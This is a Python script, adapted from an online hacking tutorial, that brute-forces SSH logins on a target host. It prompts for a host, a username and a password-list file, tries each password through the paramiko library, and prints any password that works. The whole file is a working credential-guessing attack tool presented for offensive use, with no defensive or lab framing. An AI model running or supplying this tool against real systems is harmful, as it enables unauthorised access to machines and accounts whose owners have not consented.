"""
Program to brute-force attack an computer through ssh.

From: https://null-byte.wonderhowto.com/how-to/sploit-make-ssh-brute-forcer-python-0161689/
"""

import paramiko
import sys
import os
import socket
import logging

DEFAULT_SSH_PORT = 22

LINE = "\n------------------------------------\n"

INPUT_HOST = "[*] Enter Target Host Address: "
INPUT_USERNAME = "[*] Enter SSH Username: "
INPUT_INPUT_FILE = "[*] Enter SSH Password File: "

MSG_INTERRUPT = "\n\n[*] User Requested an Interrupt"
MSG_AUTH_FAILED = "[*] Authentication Failed ..."
MSG_CONN_FAILED = "[*] Connection Failed ... Host Down"
MSG_SUCEESS = (
    "{line}"
    "[*] User: {user}\n"
    "[*] Pass Found: {password}"
    "{line}"
)
MSG_INCORRECT = (
    "[*] User: {user}\n"
    "[*] Pass: {password} "
    "=> Login Incorrect !!! <="
)
MSG_CONN_ERROR = (
    "[*] Connection Could Not Be Established To Address: {address}"
)

ERROR_FILE_PATH = "[*] File Path Does Not Exist !!!"


def get_attack_info():
    try:
        host = input(INPUT_HOST)
        username = input(INPUT_USERNAME)
        input_file_path = input(INPUT_INPUT_FILE)

        if os.path.exists(input_file_path) is False:
            sys.exit(4)
    except KeyboardInterrupt:
        print(MSG_INTERRUPT)

    return host, username, input_file_path


def ssh_connect(host, username, password):
    code = 0
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(
            host,
            port=DEFAULT_SSH_PORT,
            username=username,
            password=password)
    except paramiko.AuthenticationException:
        # [*] Authentication Failed ...
        logging.info(MSG_AUTH_FAILED)
        logging.info("Incorrect Password: '{}'".format(password))
        code = 1
    except socket.error as error:
        # [*] Connection Failed ... Host Down
        logging.info(MSG_CONN_FAILED)
        code = 2
    finally:
        ssh.close()

    return code


def brute_force(host, username, input_file_path):
    with open(input_file_path) as input_file:
        # Print a newline.
        print(LINE)

        for line in input_file:
            password = line.strip("\n")
            try:
                response = ssh_connect(host, username, password)

                if response == 0:
                    message = MSG_SUCEESS.format(
                                line=LINE,
                                user=username,
                                password=password)
                    print(message)
                elif response == 1:
                    message = MSG_INCORRECT.format(
                                user=username,
                                password=password)
                    print(message)
                elif response == 2:
                    message = MSG_CONN_ERROR.format(
                                address=host)
                    print(message)
                    sys.exit(2)
            except Exception as error:
                print(error)


def main():
    host, username, input_file_path = get_attack_info()
    brute_force(host, username, input_file_path)


if __name__ == '__main__':
    logging.basicConfig(level=logging.WARNING)
    main()
